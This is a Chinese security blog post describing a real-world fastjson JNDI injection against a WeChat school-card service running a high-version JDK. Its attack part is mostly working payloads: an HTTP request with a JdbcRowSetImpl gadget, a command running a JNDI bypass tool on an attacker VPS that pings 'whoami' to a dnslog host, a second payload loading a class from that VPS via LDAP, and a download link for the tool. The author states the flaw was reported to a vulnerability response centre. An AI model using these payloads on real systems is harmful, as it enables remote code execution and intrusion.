---
title: 实战中的高版本JDK的JNDI注入
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496033&idx=1&sn=a0f82dcdc1c6d7b25c611d7c4dea8fee&chksm=e8a5fb02dfd27214cb6e5e77bc807a67cd2f98bf16392a62e3e9d5238eb43e69c0ce8dc1e44e&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-10-08
fetch_date: 2025-10-06T18:51:45.670237
---

# 实战中的高版本JDK的JNDI注入

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj62unQ7b3lHmdhqnREcqjVnIWs8822Xq5d2f7kGJmMhPzhgaExoKjr1z3aglhcr2sPsGiaibjG9QTMQ/0?wx_fmt=jpeg)

# 实战中的高版本JDK的JNDI注入

1614593629981828

迪哥讲事

关于JNDI注入一直都是在CTF中见到的，偶然在实战中碰到了一个fastjson，是一个公众号绑定校卡的点

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj62unQ7b3lHmdhqnREcqjVnibIYo0YSEbaIFqQ7mZqKzgekicR6H7xC82Scic2J3qiaFnlDCRdnnFbmjQ/640?wx_fmt=png&from=appmsg)

通过burpsuite的插件扫到了存在fastjson的漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj62unQ7b3lHmdhqnREcqjVn6bbTKPuUquPtbCHYD2ROJzib6zqfNeNJVmjp35SrOGnBmp5SrklLU3A/640?wx_fmt=png&from=appmsg)

通过下面payload去验证是否为误报

```
POST /baas/base/base/sqlQuery HTTP/1.1
Host: xxxxxxx
Connection: close
Content-Length: 111
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090a13) XWEB/9115 Flue
Content-Type: application/json
Origin: xxxxxxx
Referer: xxxxxxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=00ED21A4EBE658A4D2B423E77CE019D5

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://dnslog","autoCommit":true}}
```

请求dnslog是能够成功的，但是执行命令始终无法成功，通过一些编码绕过也没有成功，一度没有思路不知道为什么失败，只能请求dnslog也无法提交
放了一段时间后想起来jndi注入在高版本jdk是存在限制的trustURLCodebase默认为false，无法加载远程的恶意类文件，只能加载CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件，想起来之前还分析过高版本jndi注入绕过方法，汗流浃背了，想到这个点后马上去验证，实战中直接利用工具就好了，不像CTF需要手搓链子，主打一个高效，工具地址为https://pan.baidu.com/s/1RW5Cvg1KtLuIrQ5LZPoRFQ?pwd=aij8
vps运行这个工具

```
java -jar JNDIBypass.jar -p 1389 -c "ping `whoami`.dnslog.cn"
```

执行下面这个payload

```
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://vps_ip:1389/U8ZRm", "autoCommit":true}}""}
```

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj62unQ7b3lHmdhqnREcqjVnPvibyLlGarmcC45DKWicicUxZRIWibxNm6UicyVD8fYucicXK1A3M170V4wQ/640?wx_fmt=png&from=appmsg)

一发入魂得到命令执行的回显

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj62unQ7b3lHmdhqnREcqjVn7rrPl2W8kM4DRyic9nbibmb08OY41gjSc8rBdMa2pFDP5DFbuxYuPPibQ/640?wx_fmt=png&from=appmsg)

漏洞已提交相关SRC修复中，平常都是在CTF中见到这些，这次在实战中而且在公众号遇到也挺有意思

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

原文:https://xz.aliyun.com/t/14602

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过